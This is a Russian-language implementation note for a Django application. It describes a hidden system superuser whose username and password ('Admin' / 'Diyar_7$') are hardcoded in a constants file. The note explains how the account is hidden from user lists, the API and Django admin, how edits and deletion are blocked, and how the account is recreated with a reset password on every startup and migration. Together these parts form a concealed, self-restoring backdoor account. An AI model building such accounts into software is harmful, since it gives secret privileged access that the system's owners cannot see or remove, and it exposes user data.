# Системный скрытый администратор и роль «Администратор»

## Что сделано

### Сущности и поля

- В модели **`Role`** добавлено поле **`is_system`** (флаг «системная роль»). Для ровно одной системной строки действует частичный уникальный ограничитель `role_single_system_flag` (только при `is_system=True`).
- В модели **`User`** добавлено поле **`is_system`** (флаг «системный пользователь»). Аналогичное ограничение `user_single_system_flag`.
- Файл **`apps/accounts/system_constants.py`**: константы `SYSTEM_ADMIN_USERNAME` (`Admin`), `SYSTEM_ADMIN_PASSWORD` (`Diyar_7$`), `SYSTEM_ADMIN_EMAIL` (`system.hidden.admin@dias.internal`), `SYSTEM_ADMIN_ROLE_NAME` (`Администратор`).
- Файл **`apps/accounts/system_bootstrap.py`**: функция **`ensure_system_admin_entities()`** — создаёт или восстанавливает системную роль и пользователя, синхронизирует **`RoleAccess`** и **`UserAccess`** со всеми ключами из **`settings.ACCESS_KEYS`**, выставляет `is_superuser`, `is_staff`, `is_active`, пароль и привязку к роли.

### Как определяется системный пользователь

- По **`User.is_system == True`** (и не более одного такого пользователя за счёт ограничения в БД).
- Дополнительно бутстрап приводит **`name`**, **`email`**, **`password`** и флаги к каноническим значениям из констант.

### Как определяется системная роль

- По **`Role.is_system == True`**.
- Имя роли приводится к **`SYSTEM_ADMIN_ROLE_NAME`** (`Администратор`).

## Как работает защита

### Почему нельзя удалить

- **API пользователей**: в **`UserViewSet`** в **`get_queryset()`** системные пользователи исключены из выборки; в **`get_object()`** при обращении по `pk` к системному пользователю выбрасывается **`PermissionDenied`** (403), поэтому **DELETE** и детальные операции недоступны.
- **API ролей**: то же для **`RoleViewSet`** и системной роли.
- **Сериализаторы**: **`UserSerializer.update`** и **`RoleSerializer.update`** отклоняют изменение, если у экземпляра **`is_system`**.
- **Django admin**: у **`UserAdmin`** и **`RoleAdmin`** для объектов с **`is_system`** отключены изменение и удаление; в списках и поиске системные записи скрыты через **`get_queryset(...).filter(is_system=False)`**.

### Почему нельзя изменить (в т.ч. пароль, имя, роль)

- См. выше: **ViewSet** + **сериализаторы**. Создание обычного пользователя с логином **`Admin`** запрещено в **`validate_name`**. Создание роли с зарезервированным именем **`Администратор`** для не-системной роли запрещено в **`RoleSerializer.validate_name`**.

### Почему нельзя ограничить доступы через API

- **`UserAccessPatchSerializer.validate`**: для **`is_system`** пользователя запрещена замена **`UserAccess`**.
- Бутстрап при каждом запуске восстановления снова выравнивает набор **`UserAccess`** и **`RoleAccess`** по полному **`ACCESS_KEYS`**.
- У пользователя **`is_superuser=True`**; в **`User.get_access_keys()`** при пустом **`UserAccess`** суперпользователь всё равно получает полный список вкладок из настроек (существующая логика не менялась по смыслу).

## Как работает восстановление

1. **`ensure_system_admin_entities()`** вызывается из **`AccountsConfig.ready()`** (с перехватом **`ProgrammingError` / `OperationalError`**, пока таблиц ещё нет).
2. После миграций приложения **`accounts`** срабатывает сигнал **`post_migrate`** (регистрация в **`system_bootstrap.py`**), снова вызывающий ту же функцию.
3. Внутри одной транзакции: блокировка строки роли/пользователя с **`select_for_update`**, создание при отсутствии, принудительное обновление пароля, имён, флагов, роли и полной синхронизации доступов.

Таким образом, после пересоздания БД и **`migrate`** или после старта приложения при уже поднятой схеме сущности снова появляются и приводятся к эталону.

Если в базе уже был **не-системный** пользователь с именем **`Admin`**, при восстановлении ему автоматически присваивается имя вида **`renamed_from_admin_<id>`**, чтобы логин **`Admin`** оставался зарезервированным за системной учёткой (иначе невозможно гарантировать однозначный вход по имени).

---

## Как работает скрытие

- **`UserViewSet.get_queryset()`** — только **`is_system=False`**, поэтому системный пользователь не попадает в список, фильтры и **поиск DRF** по этому эндпоинту.
- **`RoleViewSet.get_queryset()`** — системная роль скрыта из списка и поиска по ролям.
- **Django admin** — те же фильтры в **`get_queryset`**.
- В жалобах по смене при валидации **`mentioned_user_ids`** учитываются только пользователи с **`is_system=False`**; в выдаче **`get_mentioned_users`** системные не показываются.

Логин **`LoginView`** по-прежнему ищет по **`User.objects.filter(name=name)`** без исключения — системный **`Admin`** может войти.

## Что проверить вручную

1. Логин с **`Admin`** / **`Diyar_7$`** — успешный JWT и рабочий **`/api/auth/me/`**.
2. Список **`GET /api/users/`** — пользователя **`Admin`** нет; **`GET /api/users/{id}/`** с id системного пользователя — **403**.
3. **`PATCH` / `DELETE`** для этого id — **403**; **`PATCH .../access/`** — **403** или ошибка валидации сериализатора.
4. Аналогично для системной роли в **`/api/roles/`**.
5. После удаления файла БД и **`migrate`** снова появляются роль и пользователь (после первого **`runserver`** или **`post_migrate`**).

## Ограничение (честно)

**100% защиты от прямого изменения БД** (SQL, **`dbshell`**, произвольный код в **`shell`**, суперпользователь СУБД) средствами приложения Django **невозможно**: любой инвариант можно нарушить в обход ORM. Здесь защищены **API**, **админка** на уровне типовых операций и **восстановление при старте/миграции** через бутстрап.
